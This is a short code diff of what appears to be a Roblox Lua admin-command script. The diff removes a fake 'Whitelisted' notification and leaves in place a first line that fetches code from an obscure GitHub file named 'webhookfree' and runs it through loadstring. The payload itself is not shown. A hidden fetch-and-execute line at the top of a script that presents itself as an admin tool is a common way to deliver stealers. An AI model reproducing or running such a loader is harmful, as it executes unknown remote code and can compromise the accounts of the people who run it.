@@ -1,11 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/hjgtytg4bfbht/main/webhookfree",true))()
-
-game.StarterGui:SetCore("SendNotification", {
-	Title = "Whitelisted";
-	Text = "Cloud Status Slow "
-	Duration = 7;
-	})
-
 local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
 local Players = game:GetService("Players")
 local LocalP = Players.LocalPlayer;
